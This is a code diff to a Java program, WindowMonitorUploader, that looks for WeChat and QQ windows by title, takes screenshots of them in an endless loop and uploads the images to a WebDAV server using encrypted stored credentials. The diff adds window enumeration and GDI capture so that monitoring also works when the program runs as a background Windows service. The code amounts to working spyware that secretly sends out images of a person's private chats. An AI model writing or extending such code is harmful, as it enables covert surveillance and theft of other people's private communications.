@@ -30,19 +30,18 @@ package com.tlcsdm.windowmonitor;
 import com.github.sardine.Sardine;
 import com.github.sardine.SardineFactory;
 import com.sun.jna.Native;
+import com.sun.jna.platform.win32.GDI32Util;
 import com.sun.jna.platform.win32.User32;
 import com.sun.jna.platform.win32.WinDef;
 
 import javax.crypto.SecretKey;
 import javax.imageio.ImageIO;
-import java.awt.Rectangle;
-import java.awt.Robot;
-import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.time.LocalDate;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.concurrent.atomic.AtomicReference;
 
 /**
  * @author unknowIfGuestInDream
@@ -63,11 +62,14 @@ public class WindowMonitorUploader {
         Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
         while (true) {
             try {
-                String title = getActiveWindowTitle();
-                if (title.contains(MATCH_KEYWORD_1)) {
-                    uploadImage(sardine, "wechat");
-                } else if (title.contains(MATCH_KEYWORD_2)) {
-                    uploadImage(sardine, "qq");
+                WinDef.HWND hwnd = findWindowByKeyword(MATCH_KEYWORD_1);
+                if (hwnd != null) {
+                    uploadImage(sardine, "wechat", hwnd);
+                } else {
+                    hwnd = findWindowByKeyword(MATCH_KEYWORD_2);
+                    if (hwnd != null) {
+                        uploadImage(sardine, "qq", hwnd);
+                    }
                 }
                 Thread.sleep(interval);
             } catch (Exception e) {
@@ -76,8 +78,8 @@ public class WindowMonitorUploader {
         }
     }
 
-    private static void uploadImage(Sardine sardine, String prefix) throws Exception {
-        BufferedImage screenshot = takeFullScreenshot();
+    private static void uploadImage(Sardine sardine, String prefix, WinDef.HWND hwnd) throws Exception {
+        BufferedImage screenshot = takeScreenshot(hwnd);
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
         String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
         String fileName = prefix + "_" + timestamp + ".png";
@@ -91,30 +93,40 @@ public class WindowMonitorUploader {
         sardine.put(WEBDAV_URL + dateCary + "/" + fileName, imageData);
     }
 
-    private static String getActiveWindowTitle() {
-        char[] buffer = new char[1024];
-        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
-        User32.INSTANCE.GetWindowText(hwnd, buffer, 1024);
-        return Native.toString(buffer);
+    /**
+     * 使用 EnumWindows 遍历所有窗口，查找标题包含指定关键字的窗口句柄。
+     * 不依赖 GetForegroundWindow，在 Windows 服务（Session 0）中同样有效。
+     *
+     * @param keyword 窗口标题关键字
+     * @return 匹配的窗口句柄，若未找到则返回 null
+     */
+    static WinDef.HWND findWindowByKeyword(String keyword) {
+        AtomicReference<WinDef.HWND> result = new AtomicReference<>();
+        User32.INSTANCE.EnumWindows((hwnd, data) -> {
+            if (result.get() != null) {
+                return false;
+            }
+            char[] buffer = new char[1024];
+            User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.length);
+            String title = Native.toString(buffer);
+            if (title.contains(keyword)) {
+                result.set(hwnd);
+                return false;
+            }
+            return true;
+        }, null);
+        return result.get();
     }
 
     /**
-     * 截全屏
+     * 使用 GDI32Util 截取指定窗口画面。
+     * 与 java.awt.Robot 不同，此方法通过 Windows GDI API 完成截图，
+     * 在以 Windows 服务方式运行（Session 0）时同样适用。
+     *
+     * @param hwnd 目标窗口句柄
+     * @return 截取的窗口图像
      */
-    private static BufferedImage takeFullScreenshot() throws Exception {
-        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-        return new Robot().createScreenCapture(screenRect);
-    }
-
-    /**
-     * 截取窗口
-     */
-    private static BufferedImage takeWindowScreenshot() throws Exception {
-        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
-        WinDef.RECT rect = new WinDef.RECT();
-        User32.INSTANCE.GetWindowRect(hwnd, rect);
-        Rectangle captureRect = new Rectangle(rect.left, rect.top,
-                rect.right - rect.left, rect.bottom - rect.top);
-        return new Robot().createScreenCapture(captureRect);
+    static BufferedImage takeScreenshot(WinDef.HWND hwnd) {
+        return GDI32Util.getScreenshot(hwnd);
     }
 }
